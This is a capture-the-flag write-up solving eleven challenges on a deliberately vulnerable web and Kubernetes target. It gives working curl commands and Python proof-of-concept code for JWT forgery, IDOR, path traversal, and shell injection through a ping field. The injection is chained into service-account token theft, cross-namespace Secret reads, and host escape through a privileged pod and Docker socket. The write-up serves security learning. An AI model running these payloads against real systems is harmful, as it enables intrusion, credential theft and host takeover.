# Sanyar's HamCTF Writeup

## Flag 1: Leftover secrets in a Docker layer

**Vulnerability**
Docker images are layered, and `docker save` preserves every layer's history. If a file is added and then deleted in a later layer, it's still sitting in the earlier layer's tarball — nothing about `rm` in a Dockerfile actually scrubs the image history.

**Extraction**
1. Pull the image down as a tarball:
   ```bash
   docker save hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend -o backend.tar
   ```
2. Unpack it:
   ```bash
   mkdir extracted layer
   tar -xf backend.tar -C extracted
   ```
3. Walk the blob manifest to find the layer holding the deleted `.env.leaked` file, then extract just that layer:
   ```bash
   tar -xf extracted/blobs/sha256/e8b21b83f74dd5ef63dd264f70cb6de5d095da53834cc2c01bde346cd90d89c9 -C layer
   ```
4. Read `layer/app/.env` — flag's inside.

**PoC**
```python
import subprocess, os, re

subprocess.run(["docker", "save", "hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend", "-o", "backend.tar"], check=True)
os.makedirs("extracted", exist_ok=True)
os.makedirs("layer", exist_ok=True)
subprocess.run(["tar", "-xf", "backend.tar", "-C", "extracted"], check=True)
subprocess.run(["tar", "-xf", "extracted/blobs/sha256/e8b21b83f74dd5ef63dd264f70cb6de5d095da53834cc2c01bde346cd90d89c9", "-C", "layer"], check=True)

with open("layer/app/.env") as f:
    print(re.search(r'HAMAMOOZ\{[^}]+\}', f.read()).group(0))
```

---

## Flag 2: Weak JWT secret + role tampering

**Vulnerability**
Tokens are signed HS256 with the secret `changeme123`. Since HS256 is symmetric, knowing the secret means you can mint any token you want — including one with `role: admin`.

**Extraction**
1. Register/log in normally to get a starter token and inspect its payload structure.
2. Swap `role` to `admin`, re-sign with the known secret.
3. Hit the admin route with the forged token:
   ```bash
   curl -H "Authorization: Bearer <ADMIN_TOKEN>" https://ctf.seoeh.ir/admin/dashboard
   ```

**PoC**
```python
import jwt, requests, re

ORIGINAL_TOKEN = "<JWT_TOKEN>"
payload = jwt.decode(ORIGINAL_TOKEN, options={"verify_signature": False})
payload["role"] = "admin"

forged = jwt.encode(payload, "changeme123", algorithm="HS256")
resp = requests.get("https://ctf.seoeh.ir/admin/dashboard", headers={"Authorization": f"Bearer {forged}"})
print(re.search(r'HAMAMOOZ\{[^}]+\}', resp.text).group(0))
```

---

## Flag 3: Debug header bypass on an "internal" endpoint

**Vulnerability**
`/api/internal/flag` looks protected, but the only gate is a client-supplied header (`X-Debug-Mode: true`) — there's no actual auth check tied to it.

**Extraction**
```bash
curl -i https://ctf.seoeh.ir/api/internal/flag -H "X-Debug-Mode: true"
```

**PoC**
```python
import requests, re

resp = requests.get("https://ctf.seoeh.ir/api/internal/flag", headers={"X-Debug-Mode": "true"})
print(re.search(r'HAMAMOOZ\{[^}]+\}', resp.text).group(0))
```

---

## Flag 4: Schema endpoint leaking data it shouldn't

**Vulnerability**
The auto-generated OpenAPI schema is exposed with no auth, and someone left the flag sitting in a field description.

**Extraction**
```bash
curl -s https://ctf.seoeh.ir/api/schema/
```

**PoC**
```python
import requests, re

resp = requests.get("https://ctf.seoeh.ir/api/schema/")
print(re.search(r'HAMAMOOZ\{[^}]+\}', resp.text).group(0))
```

---

## Flag 5: IDOR on org reports

**Vulnerability**
`/api/orgs/{org_id}/reports/{report_id}` checks that you're logged in, but never checks that the `org_id` in the URL actually belongs to you. Swap the ID, get someone else's data.

**Extraction**
1. Log in as any user and grab a valid bearer token.
2. Request a report under an org you don't own:
   ```bash
   curl -i -H "Authorization: Bearer <TOKEN>" https://ctf.seoeh.ir/api/orgs/2/reports/2
   ```
3. Flag shows up in the `secret_note` field.

**PoC**
```python
import requests, re

TOKEN = "<TOKEN>"
resp = requests.get(
    "https://ctf.seoeh.ir/api/orgs/2/reports/2",
    headers={"Authorization": f"Bearer {TOKEN}"},
)
print(re.search(r'HAMAMOOZ\{[^}]+\}', resp.json().get("secret_note", "")).group(0))
```

---

## Flag 6: Directory traversal in report downloads

**Vulnerability**
`/api/reports/download?file=...` passes the `file` param straight to the filesystem with no path sanitization, so `../` sequences walk right out of the intended directory.

**Extraction**
```bash
curl -s "https://ctf.seoeh.ir/api/reports/download?file=../../../../app/flag.txt"
```

**PoC**
```python
import requests, re

resp = requests.get(
    "https://ctf.seoeh.ir/api/reports/download",
    params={"file": "../../../../app/flag.txt"},
)
print(re.search(r'HAMAMOOZ\{[^}]+\}', resp.text).group(0))
```

---

## Flag 7: Shell injection via the ping diagnostic

**Vulnerability**
`/api/diag/ping` builds a shell command from the `host` field without sanitizing it — classic unsanitized string concatenation into a shell call. Anything after a `;` runs.

**Extraction**
```bash
curl -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}'
```

**PoC**
```python
import requests, re

resp = requests.post(
    "https://ctf.seoeh.ir/api/diag/ping",
    json={"host": "127.0.0.1;cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"},
)
print(re.search(r'HAMAMOOZ\{[^}]+\}', resp.json().get("output", "")).group(0))
```

---

## Flag 8: Pivoting into the cluster via kubectl

**Vulnerability**
Same injection point as above, but the container has `kubectl` on PATH and a service account with enough permission to exec into other pods. That turns local command injection into a pivot across the whole namespace.

**Extraction**
```bash
curl -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; kubectl exec -n internal-tools admin-panel-678d5cdbfc-kj2t7 -- cat /app/app.py"}'
```
Flag turns up as an HTML comment inside the source file.

**PoC**
```python
import requests, re

resp = requests.post(
    "https://ctf.seoeh.ir/api/diag/ping",
    json={"host": "127.0.0.1; kubectl exec -n internal-tools admin-panel-678d5cdbfc-kj2t7 -- cat /app/app.py"},
)
print(re.search(r'HAMAMOOZ\{[^}]+\}', resp.json().get("output", "")).group(0))
```

---

## Flag 9: Cross-namespace secret read using the pod's own service account

**Vulnerability**
The pod's mounted service account token is scoped wide enough to query the Kubernetes API and read Secrets in a completely different namespace — no per-namespace RBAC restriction.

**Extraction**
```bash
curl -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets"}'
```
The flag comes back base64-encoded inside the secret data.

**PoC**
```python
import requests, base64, re

resp = requests.post(
    "https://ctf.seoeh.ir/api/diag/ping",
    json={"host": '127.0.0.1;curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets'},
)
output = resp.json().get("output", "")
encoded = re.search(r'"flag":"([^"]+)"', output).group(1)
decoded = base64.b64decode(encoded).decode('utf-8')
print(re.search(r'HAMAMOOZ\{[^}]+\}', decoded).group(0))
```

---

## Flag 10: Escaping to the host via a privileged pod

**Vulnerability**
The `legacy-worker` pod runs with `privileged: true` and has the host's root filesystem bind-mounted at `/host`. Anyone who can exec into that pod can read (or write) anything on the underlying node.

**Extraction**
```bash
curl -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt"}'
```

**PoC**
```python
import requests, re

resp = requests.post(
    "https://ctf.seoeh.ir/api/diag/ping",
    json={"host": "127.0.0.1;kubectl exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt"},
)
print(re.search(r'HAMAMOOZ\{[^}]+\}', resp.json().get("output", "")).group(0))
```

---

## Flag 11: Host takeover through an exposed Docker socket

**Vulnerability**
That same privileged pod also has the host's Docker socket bind-mounted (`/host/run/docker.sock`). Talking to that socket means you can ask the host's own Docker daemon to spin up a new container with an arbitrary host bind-mount — full read access to the node.

**Extraction**
1. Create a throwaway container that mounts host `/` and runs a command to cat the flag:
   ```bash
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" \
     -d '{"host":"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/create -H \"Content-Type: application/json\" -d \"{\\\"Image\\\":\\\"hub.hamdocker.ir/alpine:3.19\\\",\\\"Cmd\\\":[\\\"sh\\\",\\\"-c\\\",\\\"cat /host/home/ubuntu/flag.txt\\\"],\\\"HostConfig\\\":{\\\"Binds\\\":[\\\"/:/host\\\"]}}\""}'
   ```
2. Start it:
   ```bash
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" \
     -d '{"host":"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/<CONTAINER_ID>/start"}'
   ```
3. Pull the logs to read the output:
   ```bash
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" \
     -d '{"host":"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock \"http://localhost/containers/<CONTAINER_ID>/logs?stdout=true&stderr=true\""}'
   ```

**PoC**
```python
import requests, re

def diag(host_cmd):
    r = requests.post("https://ctf.seoeh.ir/api/diag/ping", json={"host": host_cmd})
    return r.json().get("output", "")

create_cmd = (
    '127.0.0.1;kubectl exec -n escape-zone legacy-worker -- '
    'curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/create '
    '-H "Content-Type: application/json" '
    '-d "{\\"Image\\":\\"hub.hamdocker.ir/alpine:3.19\\",'
    '\\"Cmd\\":[\\"sh\\",\\"-c\\",\\"cat /host/home/ubuntu/flag.txt\\"],'
    '\\"HostConfig\\":{\\"Binds\\":[\\"/:/host\\"]}}"'
)
create_out = diag(create_cmd)
container_id = re.search(r'"Id":"([^"]+)"', create_out).group(1)

diag(f'127.0.0.1;kubectl exec -n escape-zone legacy-worker -- '
     f'curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/{container_id}/start')

logs = diag(f'127.0.0.1;kubectl exec -n escape-zone legacy-worker -- '
            f'curl --unix-socket /host/run/docker.sock '
            f'"http://localhost/containers/{container_id}/logs?stdout=true&stderr=true"')
print(re.search(r'HAMAMOOZ\{[^}]+\}', logs).group(0))
```

---
